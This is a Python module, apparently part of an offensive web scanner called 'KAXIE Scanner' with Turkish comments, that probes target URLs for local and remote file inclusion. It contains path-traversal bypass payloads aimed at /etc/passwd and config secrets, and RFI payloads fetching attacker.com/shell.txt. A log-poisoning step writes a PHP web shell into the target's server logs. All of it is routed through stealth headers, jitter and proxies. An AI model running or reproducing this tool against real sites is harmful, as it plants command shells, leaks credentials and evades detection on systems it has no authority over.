"""
KAXIE Scanner - LFI/RFI (Local/Remote File Inclusion) Tarama Modülü
"""

import requests
import re
import base64
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from config import SCAN_CONFIG, Colors
from utils.stealth import StealthManager
from utils.payload_gen import PayloadGenerator


class LFIRFIScanner:
    """LFI ve RFI zafiyetlerini tespit eden sınıf."""

    def __init__(self, target, reporter, ai_engine=None, forms=None, links=None):
        self.target = target
        self.reporter = reporter
        self.ai_engine = ai_engine
        self.forms = forms or []
        self.links = links or []
        self.stealth = StealthManager()
        self.payload_gen = PayloadGenerator()
        self.session = requests.Session()
        self.session.verify = SCAN_CONFIG["verify_ssl"]
        self.vulnerable = []

    def run(self):
        """Tüm LFI/RFI testlerini çalıştırır."""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] LFI/RFI TARAMASI BAŞLADI{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] Hedef: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        self._test_lfi()
        self._test_rfi()
        self._test_php_wrappers()
        self._test_log_poisoning()
        self._test_proc_self()

        if self.ai_engine and self.ai_engine.selected_model and self.vulnerable:
            print(f"\n{Colors.MAGENTA}  [*] AI LFI/RFI analizi yapılıyor...{Colors.RESET}")
            for v in self.vulnerable:
                analysis = self.ai_engine.analyze_vulnerability(
                    vuln_type="LFI",
                    target=v["url"],
                    evidence=v["evidence"],
                    response_snippet=v.get("response", ""),
                )
                if analysis:
                    self.reporter.add_ai_analysis("LFI/RFI", analysis)

        return self.vulnerable

    def _make_request(self, url, method="GET", data=None, headers=None):
        """İstek yapar."""
        if headers is None:
            headers = self.stealth.get_headers(self.target)
        self.stealth.jitter_delay()

        try:
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            else:
                resp = self.session.post(url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            self.reporter.scan_stats["total_requests"] += 1
            return resp
        except Exception:
            return None

    def _get_lfi_indicators(self):
        """LFI kanıt imzalarını döndürür."""
        return [
            r"root:x:0:0:",
            r"daemon:x:1:1:",
            r"bin:x:2:2:",
            r"nobody:x:65534:",
            r"www-data:",
            r"administrator:500:",
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"Volume Serial Number",
            r"root::0:0",
            r"apache::",
            r"nginx::",
            r"DB_NAME",
            r"DB_PASSWORD",
            r"APP_KEY",
        ]

    def _test_lfi(self):
        """LFI testi."""
        print(f"\n  {Colors.BLUE}[*] LFI testi...{Colors.RESET}")

        lfi_payloads = self.payload_gen.get_payloads("LFI")
        bypass_variants = [
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%00/",
            "..%00/",
            "..%01/",
            "..././..././..././etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
        ]
        all_payloads = lfi_payloads + bypass_variants

        test_urls = []
        parsed_base = urlparse(self.target)
        if parsed_base.query:
            test_urls.append(self.target)

        for link in self.links[:20]:
            parsed = urlparse(link)
            if parsed.query:
                test_urls.append(link)

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                for payload in all_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                    resp = self._make_request(test_url)
                    if resp:
                        for indicator in self._get_lfi_indicators():
                            if re.search(indicator, resp.text, re.IGNORECASE):
                                evidence = f"Param: {param_name}, Payload: {payload}, Indicator: {indicator[:40]}"
                                self.reporter.add_finding(
                                    vuln_type="LFI",
                                    severity="CRITICAL",
                                    title=f"LFI zafiyeti tespit edildi ({param_name})",
                                    description="Yerel dosya dahil etme zafiyeti. Sistem dosyaları okunabiliyor.",
                                    evidence=evidence,
                                    url=test_url,
                                )
                                self.vulnerable.append({
                                    "url": test_url,
                                    "param": param_name,
                                    "type": "LFI",
                                    "payload": payload,
                                    "evidence": evidence,
                                    "response": resp.text[:300],
                                })
                                break

    def _test_rfi(self):
        """RFI testi."""
        print(f"\n  {Colors.BLUE}[*] RFI testi...{Colors.RESET}")

        rfi_payloads = [
            "http://attacker.com/shell.txt",
            "https://attacker.com/shell.txt",
            "ftp://attacker.com/shell.txt",
            "http://127.0.0.1:8080/shell.txt",
            "http://[::1]/shell.txt",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
            "expect://id",
            "php://input",
            "php://filter/convert.base64-encode/resource=index.php",
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for payload in rfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    if any(x in resp.text for x in ["uid=", "gid=", "root:", "shell>", "<?php"]):
                        evidence = f"Param: {param_name}, Payload: {payload}"
                        self.reporter.add_finding(
                            vuln_type="RFI",
                            severity="CRITICAL",
                            title=f"RFI zafiyeti tespit edildi ({param_name})",
                            description="Uzak dosya dahil etme zafiyeti. Uzaktan kod çalıştırma mümkün.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable.append({
                            "url": test_url,
                            "param": param_name,
                            "type": "RFI",
                            "payload": payload,
                            "evidence": evidence,
                            "response": resp.text[:300],
                        })
                        break

    def _test_php_wrappers(self):
        """PHP wrapper testleri."""
        print(f"\n  {Colors.BLUE}[*] PHP wrapper testleri...{Colors.RESET}")

        wrapper_tests = [
            ("php://filter/convert.base64-encode/resource=index.php", r"[A-Za-z0-9+/]{100,}={0,2}"),
            ("php://filter/read=convert.base64-encode/resource=config.php", r"[A-Za-z0-9+/]{100,}={0,2}"),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", r"uid=|root:"),
            ("expect://id", r"uid=\d+\("),
            ("input://", r"uid=|root:"),
            ("phar://test.jpg/test.txt", r"error|Exception"),
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for wrapper, pattern in wrapper_tests:
                test_params = params.copy()
                test_params[param_name] = [wrapper]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    if re.search(pattern, resp.text):
                        evidence = f"Wrapper: {wrapper}, Pattern matched"
                        self.reporter.add_finding(
                            vuln_type="LFI",
                            severity="HIGH",
                            title=f"PHP Wrapper LFI ({param_name})",
                            description=f"PHP wrapper {wrapper} çalıştırılabildi.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable.append({
                            "url": test_url,
                            "param": param_name,
                            "type": "PHP-WRAPPER",
                            "payload": wrapper,
                            "evidence": evidence,
                            "response": resp.text[:300],
                        })
                        break

    def _test_log_poisoning(self):
        """Log poisoning testi."""
        print(f"\n  {Colors.BLUE}[*] Log poisoning testi...{Colors.RESET}")

        user_agent_payload = "<?php system($_GET['cmd']); ?>"

        headers = self.stealth.get_headers(self.target)
        headers["User-Agent"] = user_agent_payload

        resp = self._make_request(self.target, headers=headers)
        if not resp:
            return

        log_paths = [
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log",
            "/var/log/apache/access.log",
            "/proc/self/environ",
            "/var/log/vsftpd.log",
            "/var/log/sshd.log",
            "/var/log/mail",
            "/var/log/apache2/error.log",
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for log_path in log_paths:
                test_params = params.copy()
                test_params[param_name] = [log_path]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    if user_agent_payload in resp.text:
                        evidence = f"Log poisoning possible. Param: {param_name}, Log: {log_path}"
                        self.reporter.add_finding(
                            vuln_type="LFI",
                            severity="CRITICAL",
                            title=f"Log Poisoning + LFI ({param_name})",
                            description="Log dosyalarına zehirleme yapıldı ve LFI ile çalıştırılabilir.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable.append({
                            "url": test_url,
                            "param": param_name,
                            "type": "LOG-POISONING",
                            "payload": log_path,
                            "evidence": evidence,
                            "response": resp.text[:300],
                        })
                        break

    def _test_proc_self(self):
        """/proc/self/ üzerinden bilgi toplama."""
        print(f"\n  {Colors.BLUE}[*] /proc/self/ enumeration...{Colors.RESET}")

        proc_paths = [
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/proc/self/fd/1",
            "/proc/self/fd/2",
            "/proc/self/status",
            "/proc/self/maps",
            "/proc/self/exe",
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for proc_path in proc_paths:
                test_params = params.copy()
                test_params[param_name] = [proc_path]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    if "HTTP_USER_AGENT" in resp.text or "PATH=" in resp.text or "GATEWAY_INTERFACE" in resp.text:
                        evidence = f"Proc access confirmed. Param: {param_name}, Path: {proc_path}"
                        self.reporter.add_finding(
                            vuln_type="LFI",
                            severity="HIGH",
                            title=f"/proc/self erişimi ({param_name})",
                            description="Süreç bilgilerine erişim mümkün. Ortam değişkenleri sızdırılabilir.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable.append({
                            "url": test_url,
                            "param": param_name,
                            "type": "PROC-SELF",
                            "payload": proc_path,
                            "evidence": evidence,
                            "response": resp.text[:300],
                        })
                        break
